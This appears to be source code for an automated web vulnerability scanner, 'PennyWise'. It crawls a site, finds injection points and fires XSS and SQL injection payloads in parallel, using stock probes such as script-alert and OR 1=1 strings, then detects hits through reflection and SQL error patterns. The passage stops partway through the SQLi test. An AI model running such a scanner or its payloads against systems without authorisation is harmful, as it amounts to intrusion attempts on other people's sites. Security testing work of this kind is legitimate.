"""
Enhanced Scanner for PennyWise.
Provides parallel, multithreaded vulnerability scanning with improved detection.
"""

import asyncio
import aiohttp
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, urlunparse
from dataclasses import dataclass, field
from typing import List, Dict, Any, Optional, Set, Callable, Tuple
from datetime import datetime
import logging
import re
import json
import time
import hashlib
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
from collections import deque

from ..config import AttackType, SeverityLevel, PennywiseConfig
from ..ai.analyzer import get_ai_analyzer, AIAnalyzer
from .scanner import ScanResult
from .results import VulnerabilityFinding
from ..utils.pdf_generator import get_pdf_generator, PDFReportGenerator, VulnerabilityReport
from ..ai.model_interface import get_ai_model

logger = logging.getLogger(__name__)



@dataclass
class ScanProgress:
    """Track scanning progress."""
    total_tasks: int = 0
    completed_tasks: int = 0
    current_phase: str = "Initializing"
    findings_count: int = 0
    requests_made: int = 0
    pages_crawled: int = 0
    start_time: datetime = field(default_factory=datetime.now)
    
    @property
    def percentage(self) -> int:
        if self.total_tasks == 0:
            return 0
        return int((self.completed_tasks / self.total_tasks) * 100)
    
    @property
    def elapsed_seconds(self) -> float:
        return (datetime.now() - self.start_time).total_seconds()


class EnhancedScanner:
    """
    Enhanced vulnerability scanner with parallel execution and improved detection.
    
    Features:
    - Concurrent request execution
    - Smart crawling with deduplication
    - Improved payload detection
    - AI-powered analysis integration
    - Real-time progress tracking
    """

    # SQL Error patterns - comprehensive detection
    SQL_ERROR_PATTERNS = [
        # MySQL errors
        (r"SQL syntax.*MySQL", "MySQL"),
        (r"Warning.*mysql_", "MySQL"),
        (r"MySqlClient\.", "MySQL"),
        (r"mysql_fetch", "MySQL"),
        (r"mysql_num_rows", "MySQL"),
        (r"MySQL.*error", "MySQL"),
        # PostgreSQL errors
        (r"PostgreSQL.*ERROR", "PostgreSQL"),
        (r"Warning.*pg_", "PostgreSQL"),
        (r"valid PostgreSQL result", "PostgreSQL"),
        (r"Npgsql\.", "PostgreSQL"),
        (r"PG::Error", "PostgreSQL"),
        # MSSQL errors
        (r"Driver.* SQL[\-\_\ ]*Server", "MSSQL"),
        (r"OLE DB.* SQL Server", "MSSQL"),
        (r"\bSQL Server\b", "MSSQL"),
        (r"SQL Server.*Driver", "MSSQL"),
        (r"Warning.*mssql_", "MSSQL"),
        (r"Microsoft.*ODBC.*SQL", "MSSQL"),
        # Oracle errors
        (r"ORA-\d{5}", "Oracle"),
        (r"Warning.*oci_", "Oracle"),
        # SQLite errors - expanded patterns for test server
        (r"SQLite.*error", "SQLite"),
        (r"sqlite3\.OperationalError", "SQLite"),
        (r"SQLITE_ERROR", "SQLite"),
        (r"sqlite3\.IntegrityError", "SQLite"),
        (r"no such column", "SQLite"),
        (r"no such table", "SQLite"),
        (r"unrecognized token", "SQLite"),
        (r"near \".*\": syntax error", "SQLite"),
        (r"SQL Error:.*sqlite", "SQLite"),
        (r"Database Error.*SQL", "SQLite"),
        # Generic SQL errors
        (r"Unclosed quotation mark", "Generic SQL"),
        (r"quoted string not properly terminated", "Generic SQL"),
        (r"syntax error at or near", "Generic SQL"),
        (r"SQL Error:", "Generic SQL"),
        (r"Database Error", "Generic SQL"),
        (r"Query:", "Generic SQL"),  # Error pages that show the query
    ]

    def __init__(self, 
                 config: Optional[PennywiseConfig] = None,
                 ai_model: Optional[Any] = None,
                 learner: Optional[Any] = None,
                 payloads: Optional[Any] = None,
                 max_concurrent_requests: int = 100,
                 on_finding: Optional[Callable[[VulnerabilityFinding], None]] = None,
                 on_progress: Optional[Callable[[ScanProgress], None]] = None,
                 on_log: Optional[Callable[[str, str], None]] = None):
        """
        Initialize the enhanced scanner.
        
        Args:
            config: PennyWise configuration
            ai_model: AI model interface for analysis
            learner: Behavior learner for reinforcement learning
            payloads: Dynamic payload library
            max_concurrent_requests: Maximum concurrent HTTP requests (default 100 for speed)
            on_finding: Callback for real-time finding notifications
            on_progress: Callback for progress updates
            on_log: Callback for log messages (message, level)
        """
        self.config = config or PennywiseConfig()
        self.ai_model = ai_model
        self.learner = learner
        self.payloads = payloads
        self.max_concurrent = max_concurrent_requests
        self.on_finding = on_finding
        self.on_progress = on_progress
        self.on_log = on_log

        # Initialize AI analyzer
        if self.ai_model is None:
            self.ai_analyzer = get_ai_analyzer()
        else:
            # Create AI analyzer that uses the provided model
            self.ai_analyzer = get_ai_analyzer()

        # Initialize PDF generator
        self.pdf_generator = get_pdf_generator()

        self._finding_counter = 0
        self._semaphore: Optional[asyncio.Semaphore] = None
        self._session: Optional[aiohttp.ClientSession] = None
        self._seen_responses: Set[str] = set()
        
        # Batch logging to prevent spam
        self._log_batch: List[str] = []
        self._batch_size = 20
        self._last_batch_flush = time.time()
        
        self.progress = ScanProgress()

        # Operational log to persist CLI-friendly events
        self._op_log_path = Path("pennywise_log.json")
        self._op_events: List[Dict[str, Any]] = []
        
        self._log(f"Enhanced Scanner initialized (max concurrent: {max_concurrent_requests})", "info")
        logger.info(f"Enhanced Scanner initialized (max concurrent: {max_concurrent_requests})")
    
    def _log(self, message: str, level: str = "info", force_flush: bool = False):
        """Send log message to callback if available (batched to prevent spam)."""
        if not self.on_log:
            return
        
        # Important messages bypass batch (success, error, warning)
        if level in ['success', 'error', 'warning'] or force_flush:
            # Flush any pending batch first
            if self._log_batch:
                self.on_log("\n".join(self._log_batch), "info")
                self._log_batch.clear()
            self.on_log(message, level)
            self._last_batch_flush = time.time()
        else:
            # Batch info messages
            self._log_batch.append(f"[{level}] {message}")
            
            # Auto-flush if batch is full or 2 seconds passed
            if len(self._log_batch) >= self._batch_size or (time.time() - self._last_batch_flush) > 2:
                self.on_log("\n".join(self._log_batch), "info")
                self._log_batch.clear()
                self._last_batch_flush = time.time()

    def _log_op(self, event: str, data: Dict[str, Any]):
        """Append operational events to pennywise_log.json for post-run inspection."""
        entry = {
            "timestamp": datetime.now().isoformat(),
            "event": event,
            "data": data
        }
        self._op_events.append(entry)
        try:
            self._op_log_path.write_text(json.dumps(self._op_events, indent=2))
        except Exception as e:
            logger.debug(f"Failed to persist operational log: {e}")
    
    async def scan(self,
                   url: str,
                   attack_types: Optional[List[AttackType]] = None,
                   crawl: bool = True,
                   max_pages: int = 50) -> ScanResult:
        """
        Perform a comprehensive vulnerability scan.
        
        Args:
            url: Target URL to scan
            attack_types: Specific attack types to test (None = auto-detect)
            crawl: Whether to crawl for additional pages
            max_pages: Maximum pages to crawl
            
        Returns:
            Complete scan results dictionary
        """
        self.progress = ScanProgress(start_time=datetime.now())
        findings: List[VulnerabilityFinding] = []
        
        try:
            self._semaphore = asyncio.Semaphore(self.max_concurrent)
            
            connector = aiohttp.TCPConnector(
                limit=self.max_concurrent,
                ssl=False
            )
            
            timeout = aiohttp.ClientTimeout(total=30)
            
            async with aiohttp.ClientSession(
                connector=connector,
                timeout=timeout,
                headers={"User-Agent": self.config.scan.user_agent}
            ) as session:
                self._session = session
                
                # Phase 1: Initial analysis
                self._update_progress("Analyzing target...", 0, 100)
                target_info = await self._analyze_target(url)
                
                if not target_info['success']:
                    return self._create_error_result(url, target_info.get('error', 'Target unreachable'))
                
                # Phase 2: AI-powered attack recommendation
                self._update_progress("Determining attack strategy...", 10, 100)
                ai_recommendations = self.ai_analyzer.analyze_target(
                    url, 
                    target_info.get('html', ''),
                    target_info.get('headers', {})
                )
                
                logger.info(f"AI recommended {len(ai_recommendations)} attack types")

                # Resolve attack types: prefer AI/analysis picks, fall back to supported defaults
                attack_types = self._normalize_attack_types(attack_types, ai_recommendations)
                if not attack_types:
                    attack_types = [
                        AttackType.XSS,
                        AttackType.SQLI,
                        AttackType.CSRF,
                        AttackType.AUTH,
                        AttackType.SSRF,
                        AttackType.IDOR,
                        AttackType.RCE,
                        AttackType.LFI,
                        AttackType.OPEN_REDIRECT,
                        AttackType.XXE
                    ]
                logger.info(f"Using attack set: {[at.value for at in attack_types]}")
                
                # Phase 3: Crawl for additional pages
                pages_to_scan = [url]
                if crawl:
                    self._update_progress("Crawling for pages...", 15, 100)
                    pages_to_scan = await self._crawl_site(url, max_pages)
                
                self.progress.pages_crawled = len(pages_to_scan)
                
                # Show all discovered paths and subdomains
                self._log(f"\n{'='*60}", "info", force_flush=True)
                self._log(f"🔍 DISCOVERED PATHS/ENDPOINTS ({len(pages_to_scan)} total)", "success", force_flush=True)
                self._log(f"{'='*60}", "info", force_flush=True)
                
                # Group by domain/subdomain
                from collections import defaultdict
                by_domain = defaultdict(list)
                for page in pages_to_scan:
                    parsed = urlparse(page)
                    domain_key = f"{parsed.scheme}://{parsed.netloc}"
                    path = parsed.path or '/'
                    by_domain[domain_key].append(path)
                
                for domain, paths in by_domain.items():
                    self._log(f"\n📍 {domain}", "success", force_flush=True)
                    for path in sorted(set(paths)):
                        self._log(f"   └─ {path}", "info", force_flush=True)
                
                self._log(f"\n{'='*60}\n", "info", force_flush=True)
                logger.info(f"Found {len(pages_to_scan)} pages to scan")
                
                # Phase 4: Extract injection points from all pages
                self._update_progress("Extracting injection points...", 25, 100)
                injection_points = await self._extract_injection_points(pages_to_scan)
                
                # Add common API endpoints for SPAs (like Juice Shop)
                api_injection_points = self._get_common_api_endpoints(url)
                injection_points.extend(api_injection_points)
                
                # Show injection points summary
                self._log(f"\n{'='*60}", "info", force_flush=True)
                self._log(f"🎯 INJECTION POINTS ({len(injection_points)} total)", "success", force_flush=True)
                self._log(f"{'='*60}", "info", force_flush=True)
                
                from collections import Counter
                by_type = Counter([pt.get('location', 'unknown') for pt in injection_points])
                self._log(f"Query params: {by_type.get('query', 0)}", "info", force_flush=True)
                self._log(f"Form inputs: {by_type.get('form', 0)}", "info", force_flush=True)
                self._log(f"API endpoints: {by_type.get('api', 0)}", "info", force_flush=True)
                # Show a few concrete injection points for visibility
                for sample in injection_points[:5]:
                    self._log(
                        f"  - {sample.get('location','?').upper()} {sample.get('method','GET')} {sample.get('parameter')} @ {urlparse(sample.get('url','')).path}",
                        "info",
                        force_flush=True
                    )
                self._log(f"\n{'='*60}\n", "info", force_flush=True)

                self._log_op("injection_points", {
                    "total": len(injection_points),
                    "by_type": by_type,
                    "sample": injection_points[:5]
                })
                
                logger.info(f"Found {len(injection_points)} injection points")
                
                # Phase 5: Execute attacks in parallel
                self._update_progress("Executing security tests...", 30, 100)

                # Calculate total tasks
                self.progress.total_tasks = len(injection_points) * len(attack_types)

                logger.info(f"🚀 Starting attack execution: {len(attack_types)} attack types, {len(injection_points)} injection points")
                logger.info(f"📋 Attack types: {[at.value for at in attack_types]}")

                # Run attacks concurrently
                attack_tasks = []

                for attack_type in attack_types:
                    logger.info(f"🔧 Creating tasks for {attack_type.value} attack")
                    if attack_type == AttackType.XSS:
                        attack_tasks.extend([
                            self._test_xss(point) for point in injection_points
                        ])
                        logger.info(f"   Created {len(injection_points)} XSS tasks")
                    elif attack_type == AttackType.SQLI:
                        attack_tasks.extend([
                            self._test_sqli(point) for point in injection_points
                        ])
                        logger.info(f"   Created {len(injection_points)} SQLi tasks")
                    elif attack_type == AttackType.CSRF:
                        # Test CSRF on ALL crawled pages, not just the main page
                        attack_tasks.append(self._test_csrf_all_pages(pages_to_scan))
                    elif attack_type == AttackType.AUTH:
                        attack_tasks.append(self._test_auth(url, target_info))
                    elif attack_type == AttackType.SSRF:
                        attack_tasks.extend([self._test_ssrf(point) for point in injection_points])
                    elif attack_type == AttackType.IDOR:
                        attack_tasks.extend([self._test_idor(point) for point in injection_points])
                    elif attack_type == AttackType.RCE:
                        attack_tasks.extend([self._test_rce(point) for point in injection_points])
                    elif attack_type == AttackType.LFI:
                        attack_tasks.extend([self._test_lfi(point) for point in injection_points])
                    elif attack_type == AttackType.OPEN_REDIRECT:
                        attack_tasks.extend([self._test_open_redirect(point) for point in injection_points])
                    elif attack_type == AttackType.XXE:
                        attack_tasks.extend([self._test_xxe(point) for point in injection_points])
                
                # Execute all attack tasks with concurrency limit
                results = await asyncio.gather(*attack_tasks, return_exceptions=True)
                
                # Collect findings
                for i, result in enumerate(results):
                    if isinstance(result, Exception):
                        logger.warning(f"Attack task {i} failed with exception: {result}")
                        self._log(f"Attack task failed: {str(result)[:100]}", "warning")
                    elif isinstance(result, list):
                        findings.extend(result)
                    elif isinstance(result, VulnerabilityFinding):
                        findings.append(result)
                
                # Phase 6: AI severity classification (with batch processing for efficiency)
                self._update_progress("Classifying findings...", 90, 100)
                
                if findings:
                    try:
                        # Check if AI analysis is enabled
                        if self.config.ai.enabled and self.ai_analyzer:
                            # Use batch processing for much better performance
                            finding_dicts = [f.to_dict() for f in findings]
                            classifications = self.ai_analyzer.batch_classify_severity(finding_dicts)
                            
                            # Apply classifications to findings
                            for finding, classification in zip(findings, classifications):
                                if classification and classification.severity:
                                    finding.severity = SeverityLevel(classification.severity.lower())
                                    finding.cvss_score = classification.cvss_score or finding.cvss_score
                            
                            # Get remediation suggestions in batches
                            remediation_batches = self.ai_analyzer.batch_suggest_remediation(finding_dicts)
                            
                            # Apply remediation suggestions to findings
                            for finding, suggestions in zip(findings, remediation_batches):
                                if suggestions:
                                    finding.recommendations = [s.title for s in suggestions[:3]]
                        else:
                            self._log("AI analysis disabled, using heuristic classification", "info")
                                
                    except Exception as e:
                        logger.debug(f"AI batch classification error: {e}")
                        # Keep existing severity from finding
                
                # Flush any remaining batched logs
                if self._log_batch:
                    self.on_log("\n".join(self._log_batch), "info")
                    self._log_batch.clear()
                
                # Phase 7: Generate summary
                self._update_progress("Generating report...", 95, 100)
                try:
                    summary = self.ai_analyzer.generate_summary([f.to_dict() for f in findings])
                except Exception as e:
                    logger.debug(f"Summary generation error: {e}")
                    summary = {
                        'overall_risk': 'High' if findings else 'Low',
                        'summary': f'Found {len(findings)} vulnerabilities',
                        'recommendations': ['Review findings and implement fixes']
                    }
                
                self._update_progress("Scan complete!", 100, 100)
                self.progress.findings_count = len(findings)
        
        except Exception as e:
            logger.error(f"Scan failed: {e}")
            return self._create_error_result(url, str(e))
        
        # Create ScanResult
        result = ScanResult(
            target_url=url,
            findings=findings,
            pages_scanned=self.progress.pages_crawled,
            requests_made=self.progress.requests_made,
            duration_seconds=self.progress.elapsed_seconds,
            status="completed",
            start_time=self.progress.start_time,
            end_time=datetime.now()
        )
        
        # Record results with learner for future improvement
        if self.learner:
            try:
                self.learner.record_scan_results(result, attack_types)
            except Exception as e:
                logger.debug(f"Learner recording failed: {e}")
        
        return result

    def generate_pdf_report(self, scan_result: ScanResult, output_path: str) -> bool:
        """
        Generate a comprehensive PDF report for the scan results.

        Args:
            scan_result: The completed scan result
            output_path: Path to save the PDF report

        Returns:
            True if report generated successfully
        """
        try:
            # Generate summary using AI analyzer
            summary = self.ai_analyzer.generate_summary([f.to_dict() for f in scan_result.findings])

            # Get AI logs
            ai_logs = []
            if self.ai_model:
                ai_logs = [log.__dict__ if hasattr(log, '__dict__') else log
                          for log in self.ai_model.get_ai_logs()]

            # Get prevention suggestions for each finding
            prevention_suggestions = {}
            for finding in scan_result.findings:
                vuln_type = finding.attack_type.value.lower()
                suggestions = self.ai_analyzer.suggest_remediation(finding.to_dict())
                # Convert RemediationSuggestion objects to dicts
                prevention_suggestions[vuln_type] = [
                    {
                        'title': s.title,
                        'description': s.description,
                        'code_example': s.code_example,
                        'references': s.references,
                        'effort': s.effort
                    } for s in suggestions
                ]

            # Capture screenshots for critical/high findings
            screenshots = {}
            for finding in scan_result.findings:
                if finding.severity in ['Critical', 'High']:
                    vuln_id = f"vuln_{finding.id}"
                    screenshot = self.pdf_generator.capture_screenshot(finding.url)
                    if screenshot:
                        screenshots[vuln_id] = screenshot

            # Create report data
            report_data = VulnerabilityReport(
                scan_summary=summary,
                findings=[f.to_dict() for f in scan_result.findings],
                ai_logs=ai_logs,
                screenshots=screenshots,
                prevention_suggestions=prevention_suggestions,
                scan_metadata={
                    'target_url': scan_result.target_url,
                    'scan_date': scan_result.start_time.strftime('%Y-%m-%d %H:%M:%S'),
                    'scan_mode': 'Full',
                    'user_agent': 'PennyWise Scanner v2.0',
                    'timeout': 30,
                    'pages_crawled': scan_result.pages_scanned,
                    'requests_made': scan_result.requests_made,
                    'duration': scan_result.duration_seconds
                }
            )

            # Generate PDF
            success = self.pdf_generator.generate_report(report_data, output_path)

            if success:
                self._log(f"PDF report generated: {output_path}", "success")
            else:
                self._log(f"Failed to generate PDF report", "error")

            return success

        except Exception as e:
            logger.error(f"PDF report generation failed: {e}")
            self._log(f"PDF report generation failed: {e}", "error")
            return False

    async def _analyze_target(self, url: str) -> Dict[str, Any]:
        """Analyze the target URL."""
        try:
            async with self._semaphore:
                async with self._session.get(url) as response:
                    self.progress.requests_made += 1
                    html = await response.text()
                    
                    return {
                        'success': True,
                        'url': url,
                        'status_code': response.status,
                        'headers': dict(response.headers),
                        'html': html,
                        'content_length': len(html),
                    }
        except Exception as e:
            logger.error(f"Target analysis failed: {e}")
            parsed = urlparse(url)
            hint = None
            if parsed.hostname in {"localhost", "127.0.0.1"} and "refused" in str(e).lower():
                hint = "Ensure the vulnerable sandbox server is running (python -m pennywise.sandbox.vulnerable_server) and the port matches the target URL."
            return {'success': False, 'error': f"{e}{' | ' + hint if hint else ''}"}
    
    async def _crawl_site(self, start_url: str, max_pages: int) -> List[str]:
        """Crawl the site to discover pages."""
        seen = {start_url}
        queue = deque([start_url])
        pages = [start_url]
        
        parsed_start = urlparse(start_url)
        base_domain = parsed_start.netloc
        
        while queue and len(pages) < max_pages:
            current_url = queue.popleft()
            self._log(f"🌐 Crawling: {current_url}")

            try:
                async with self._semaphore:
                    async with self._session.get(current_url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                        self.progress.requests_made += 1

                        content_type = response.headers.get('Content-Type', '')
                        if 'text/html' not in content_type:
                            continue

                        html = await response.text()
                        soup = BeautifulSoup(html, 'html.parser')

                        # Find all links and form actions
                        for link in soup.find_all(['a', 'form']):
                            href = link.get('href') or link.get('action')
                            if not href:
                                continue

                            full_url = urljoin(current_url, href.split('#')[0])
                            parsed = urlparse(full_url)

                            # Stay on same domain
                            if parsed.netloc != base_domain:
                                continue

                            # Normalize URL
                            normalized = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

                            if normalized not in seen:
                                seen.add(normalized)
                                queue.append(full_url)
                                pages.append(full_url)
                                self._log_op("crawl_discovery", {"url": full_url})

                                if len(pages) >= max_pages:
                                    break

            except Exception as e:
                logger.debug(f"Crawl error for {current_url}: {e}")

            await asyncio.sleep(0.05)  # Small delay

        self._log(f"🌐 Crawl complete - {len(pages)} pages discovered", "info", force_flush=True)
        if pages:
            preview = "\n".join([f"  - {p}" for p in pages[:10]])
            self._log(f"Discovered pages:\n{preview}", "info", force_flush=True)
        self._log_op("crawl_complete", {"pages": list(pages)})
        return pages
    
    async def _extract_injection_points(self, pages: List[str]) -> List[Dict[str, Any]]:
        """Extract all injection points from pages."""
        injection_points = []

        logger.info(f"🔍 Extracting injection points from {len(pages)} pages: {pages[:3]}...")  # Debug log

        for page_url in pages:
            try:
                logger.info(f"📄 Processing page: {page_url}")  # Debug log
                async with self._semaphore:
                    async with self._session.get(page_url) as response:
                        self.progress.requests_made += 1
                        html = await response.text()
                        soup = BeautifulSoup(html, 'html.parser')

                        # Extract URL parameters
                        parsed = urlparse(page_url)
                        if parsed.query:
                            params = parse_qs(parsed.query)
                            logger.info(f"🔗 Found query params in {page_url}: {list(params.keys())}")  # Debug log
                            for param in params.keys():
                                injection_points.append({
                                    'url': page_url,
                                    'parameter': param,
                                    'location': 'query',
                                    'method': 'GET',
                                    'original_value': params[param][0] if params[param] else ''
                                })
                                injection_points.append({
                                    'url': page_url,
                                    'parameter': param,
                                    'location': 'query',
                                    'method': 'GET',
                                    'original_value': params[param][0] if params[param] else ''
                                })
                        
                        # Extract form inputs
                        for form in soup.find_all('form'):
                            action = form.get('action', '')
                            form_url = urljoin(page_url, action) if action else page_url
                            method = form.get('method', 'GET').upper()
                            
                            for inp in form.find_all(['input', 'textarea']):
                                name = inp.get('name')
                                if not name:
                                    continue
                                
                                input_type = inp.get('type', 'text').lower()
                                if input_type in ['submit', 'button', 'hidden', 'file']:
                                    continue
                                
                                injection_points.append({
                                    'url': form_url,
                                    'parameter': name,
                                    'location': 'form',
                                    'method': method,
                                    'original_value': inp.get('value', ''),
                                    'input_type': input_type
                                })
            
            except Exception as e:
                logger.debug(f"Extraction error for {page_url}: {e}")

        logger.info(f"🎯 Found {len(injection_points)} injection points total")  # Debug log
        for i, pt in enumerate(injection_points[:5]):  # Show first 5
            logger.info(f"   {i+1}. {pt['location']}: {pt['parameter']} in {pt['url']}")

        return injection_points
    
    def _get_common_api_endpoints(self, base_url: str) -> List[Dict[str, Any]]:
        """Generate common API endpoints for SPAs and REST APIs - only if the site appears API-driven."""
        parsed = urlparse(base_url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        
        # Check if this looks like an API-driven site (has /api/ or /rest/ in the URL or content)
        # For now, be conservative and only add API endpoints for known API-driven targets
        api_indicators = ['juice.zeabur.app', 'api.', '.api', 'rest.']
        is_api_site = any(indicator in base_url.lower() for indicator in api_indicators)
        
        if not is_api_site:
            self._log("Skipping API endpoints for non-API site", "info")
            return []
        
        # Common REST API login/auth endpoints
        common_endpoints = [
            # Login endpoints
            {'path': '/rest/user/login', 'params': ['email', 'password'], 'method': 'POST'},
            {'path': '/api/login', 'params': ['email', 'password', 'username'], 'method': 'POST'},
            {'path': '/api/auth/login', 'params': ['email', 'password', 'username'], 'method': 'POST'},
            {'path': '/api/v1/login', 'params': ['email', 'password', 'username'], 'method': 'POST'},
            {'path': '/api/users/login', 'params': ['email', 'password'], 'method': 'POST'},
            {'path': '/login', 'params': ['email', 'password', 'username'], 'method': 'POST'},
            {'path': '/auth/login', 'params': ['email', 'password'], 'method': 'POST'},
            # User/Search endpoints
            {'path': '/rest/products/search', 'params': ['q'], 'method': 'GET'},
            {'path': '/rest/products', 'params': ['id', 'q'], 'method': 'GET'},
            {'path': '/api/search', 'params': ['q', 'query', 'search'], 'method': 'GET'},
            {'path': '/api/products', 'params': ['id', 'category'], 'method': 'GET'},
            {'path': '/api/users', 'params': ['id', 'email'], 'method': 'GET'},
            {'path': '/rest/user/change-password', 'params': ['current', 'new', 'repeat'], 'method': 'POST'},
            {'path': '/rest/user/reset-password', 'params': ['email'], 'method': 'POST'},
            {'path': '/rest/feedback', 'params': ['comment', 'rating'], 'method': 'POST'},
            # Other common endpoints
            {'path': '/rest/user/whoami', 'params': ['token'], 'method': 'GET'},
            {'path': '/api/v1/users', 'params': ['id'], 'method': 'GET'},
            {'path': '/rest/basket/1', 'params': ['coupon', 'id'], 'method': 'GET'},
            {'path': '/redirect', 'params': ['to'], 'method': 'GET'},
            {'path': '/file', 'params': ['file'], 'method': 'GET'},
        ]
        
        injection_points = []
        for endpoint in common_endpoints:
            url = urljoin(base, endpoint['path'])
            for param in endpoint['params']:
                injection_points.append({
                    'url': url,
                    'parameter': param,
                    'location': 'api',
                    'method': endpoint['method'],
                    'original_value': '',
                    'is_api': True
                })
        
        self._log(f"Added {len(injection_points)} common API injection points", "info")
        return injection_points
    
    async def _test_single_xss_payload(self, url: str, param: str, payload: str, 
                                        method: str = 'GET', is_api: bool = False) -> Optional[VulnerabilityFinding]:
        """
        Test a single XSS payload against an injection point.
        
        Returns a VulnerabilityFinding if XSS is detected, None otherwise.
        """
        try:
            async with self._semaphore:
                self.progress.requests_made += 1
                self.progress.completed_tasks += 1
                
                if is_api and method == 'POST':
                    # JSON API request
                    json_data = {param: payload}
                    headers = {'Content-Type': 'application/json'}
                    async with self._session.post(url, json=json_data, headers=headers, 
                                                   timeout=aiohttp.ClientTimeout(total=10)) as response:
                        html = await response.text()
                        status = response.status
                        content_type = response.headers.get('Content-Type', '')
                elif method == 'POST':
                    # Form POST request
                    data = {param: payload}
                    async with self._session.post(url, data=data, 
                                                   timeout=aiohttp.ClientTimeout(total=10)) as response:
                        html = await response.text()
                        status = response.status
                        content_type = response.headers.get('Content-Type', '')
                else:
                    # GET request
                    test_url = self._inject_into_url(url, param, payload)
                    async with self._session.get(test_url, 
                                                  timeout=aiohttp.ClientTimeout(total=10)) as response:
                        html = await response.text()
                        status = response.status
                        content_type = response.headers.get('Content-Type', '')
                
                # Check if payload is reflected (unescaped)
                is_json = 'json' in content_type.lower()
                
                if self._check_xss_reflection(html, payload, is_json):
                    # Determine severity based on context
                    severity = SeverityLevel.HIGH
                    if '<script' in payload.lower() or 'onerror=' in payload.lower():
                        severity = SeverityLevel.CRITICAL
                    
                    evidence = self._extract_evidence(html, payload, context=150)
                    
                    return self._create_finding(
                        attack_type=AttackType.XSS,
                        severity=severity,
                        title=f"Reflected XSS in '{param}'",
                        description=f"XSS payload is reflected unescaped in the response. "
                                    f"This allows execution of arbitrary JavaScript in user browsers.",
                        url=url,
                        parameter=param,
                        payload=payload,
                        evidence=evidence,
                        recommendations=[
                            "Sanitize and encode all user input before rendering in HTML",
                            "Implement Content-Security-Policy headers",
                            "Use framework-provided auto-escaping (e.g., Jinja2, React)",
                            "Validate input against a whitelist of allowed characters"
                        ]
                    )
                
        except Exception as e:
            logger.debug(f"XSS test error for {url}/{param}: {e}")
        
        return None
    
    async def _test_xss(self, injection_point: Dict[str, Any]) -> List[VulnerabilityFinding]:
        """Test for XSS vulnerabilities."""
        findings = []
        url = injection_point['url']
        param = injection_point['parameter']
        method = injection_point.get('method', 'GET')
        is_api = injection_point.get('is_api', False)
        
        # Select payloads based on context using dynamic library
        if self.payloads:
            if is_api:
                xss_payloads = self.payloads.get_payloads(AttackType.XSS, limit=15, category='api_json')
                if not xss_payloads:
                    xss_payloads = self.payloads.get_payloads(AttackType.XSS, limit=10)
            else:
                xss_payloads = self.payloads.get_payloads(AttackType.XSS, limit=20)
            payloads = [p.vector for p in xss_payloads]
        else:
            # Fallback to basic payloads if library not available
            payloads = ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '"><script>alert(1)</script>']
        
        # Run payloads in parallel batches
        batch_size = 10
        total_tested = 0
        for batch_idx in range(0, len(payloads), batch_size):
            batch = payloads[batch_idx:batch_idx + batch_size]
            tasks = []
            
            for payload in batch:
                tasks.append(self._test_single_xss_payload(url, param, payload, method, is_api))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            total_tested += len(batch)
            
            # Log batch progress
            self._log(f"XSS [{total_tested}/{len(payloads)}] {param}@{urlparse(url).path} (API:{is_api})")
            
            for result in results:
                if isinstance(result, VulnerabilityFinding):
                    findings.append(result)
                    self._notify_finding(result)
                    self._log(f"✓ XSS FOUND in '{param}' with payload: {result.payload[:40]}...", "success", force_flush=True)
                    return findings  # Found XSS, stop testing
        
        return findings

    async def _test_sqli(self, injection_point: Dict[str, Any]) -> List[VulnerabilityFinding]:
        """Test for SQL Injection vulnerabilities."""
        findings = []
        url = injection_point['url']
        param = injection_point['parameter']
        method = injection_point.get('method', 'GET')
        is_api = injection_point.get('is_api', False)

        # Get SQLi payloads from dynamic library
        if self.payloads:
            sqli_payloads = self.payloads.get_payloads(AttackType.SQLI, limit=20)
            payloads = [p.vector for p in sqli_payloads]
        else:
            # Fallback payloads if library not available
            payloads = [
                "'", "''", "' OR '1'='1", "' OR 1=1 --",
                "' UNION SELECT NULL --", "' UNION SELECT 1,2,3 --",
                "1' OR '1'='1", "1 OR 1=1",
                "' AND 1=0 UNION SELECT 'test' --",
                "' ORDER BY 1 --", "' GROUP BY 1 --"
            ]

        # Run payloads in parallel batches like XSS
        batch_size = 10
        total_tested = 0
        for batch_idx in range(0, len(payloads), batch_size):
            batch = payloads[batch_idx:batch_idx + batch_size]
            tasks = []

            for payload in batch:
                tasks.append(self._test_single_sqli_payload(url, param, payload, method, is_api))

            results = await asyncio.gather(*tasks, return_exceptions=True)
            total_tested += len(batch)

            # Log batch progress
            self._log(f"SQLi [{total_tested}/{len(payloads)}] {param}@{urlparse(url).path} (API:{is_api})")

            for result in results:
                if isinstance(result, VulnerabilityFinding):
                    findings.append(result)
                    self._notify_finding(result)
                    self._log(f"✓ SQLi FOUND in '{param}' with payload: {result.payload[:40]}...", "success", force_flush=True)
                    return findings  # Found SQLi, stop testing

        return findings

    async def _test_single_sqli_payload(self, url: str, param: str, payload: str,
                                         method: str = 'GET', is_api: bool = False) -> Optional[VulnerabilityFinding]:
        """
        Test a single SQLi payload against an injection point.
        
        Returns a VulnerabilityFinding if SQLi is detected, None otherwise.
        """
        try:
            async with self._semaphore:
                self.progress.requests_made += 1
                self.progress.completed_tasks += 1
                
                if is_api and method == 'POST':
                    # JSON API request
                    json_data = {param: payload}
                    headers = {'Content-Type': 'application/json'}
                    async with self._session.post(url, json=json_data, headers=headers, 
                                                   timeout=aiohttp.ClientTimeout(total=10)) as response:
                        html = await response.text()
                        status = response.status
                elif method == 'POST':
                    # Form POST request
                    data = {param: payload}
                    async with self._session.post(url, data=data, 
                                                   timeout=aiohttp.ClientTimeout(total=10)) as response:
                        html = await response.text()
                        status = response.status
                else:
                    # GET request
                    test_url = self._inject_into_url(url, param, payload)
                    async with self._session.get(test_url, 
                                                  timeout=aiohttp.ClientTimeout(total=10)) as response:
                        html = await response.text()
                        status = response.status
                
                # Check for SQL injection indicators
                if self._check_sqli_vulnerability(html, payload):
                    # Determine severity based on error type
                    severity = SeverityLevel.HIGH
                    if any(error in html.lower() for error in ['you have an error in your sql syntax', 'sql syntax error', 'mysql error']):
                        severity = SeverityLevel.CRITICAL
                    
                    evidence = self._extract_evidence(html, payload, context=150)
                    
                    return self._create_finding(
                        attack_type=AttackType.SQLI,
                        severity=severity,
                        title=f"SQL Injection in '{param}'",
                        description=f"SQL injection vulnerability detected. Malicious SQL input causes database errors or unexpected behavior.",
                        url=url,
                        parameter=param,
                        payload=payload,
                        evidence=evidence,
